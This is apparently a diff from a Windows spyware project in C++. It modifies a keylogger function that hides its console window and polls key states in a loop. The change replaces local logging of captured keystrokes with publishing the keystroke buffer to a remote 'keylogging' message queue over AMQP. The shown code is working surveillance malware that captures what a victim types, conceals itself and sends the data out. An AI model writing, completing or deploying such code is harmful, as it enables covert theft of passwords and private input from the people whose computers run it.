@@ -11,16 +11,14 @@
 #include "keylogger.hpp"
 #include "../core/debug.hpp"
 
+// TODO : Maybe add linux support
 
-/* Windows specifique functions*/
+/* Windows specifique functionaly*/
 #if defined(_WIN64) || defined(_WIN32)
 bool WinHandleKeyStroke (std::wstring &, int);
 void WinScannedKeyTranslate (std::wstring &, int);
-#endif
 
-void startKeylogger(/* AmqpClient &amqpClient */) {
-#if defined(_WIN64) || defined(_WIN32)
-    std::ofstream logFile ("logs_hsgshg.txt");
+void startKeylogger(AmqpClient &amqpClient) {
     std::wstring keyStrokeBuffer;
     std::wstring_convert<std::codecvt_utf8<wchar_t>> converter;
 
@@ -29,8 +27,6 @@ void startKeylogger(/* AmqpClient &amqpClient */) {
     AllocConsole();
     stealth = FindWindowA("ConsoleWindowClass", NULL);
     ShowWindow(stealth, 0);
-
-    logFile << "Start" << std::endl;
 
     while ( true ) {
         Sleep(10);
@@ -42,17 +38,12 @@ void startKeylogger(/* AmqpClient &amqpClient */) {
         
         if (keyStrokeBuffer.length() >= _SPYWARE_KEYLOG_BUFFER_MAX_) {
             std::string logs = converter.to_bytes(keyStrokeBuffer);
-            logFile << logs;
+            amqpClient.basicPublish("", "keylogging", logs);
             keyStrokeBuffer.clear();
-            logFile.flush();
         }
     }
-#else
-    throw "Key logger is not supported fro this operating system";
-#endif
 }
 
-#if defined(_WIN64) || defined(_WIN32)
 bool WinHandleKeyStroke (std::wstring &input, int scannedKey) {
     if ( GetAsyncKeyState(scannedKey) != -32767) return false;
 
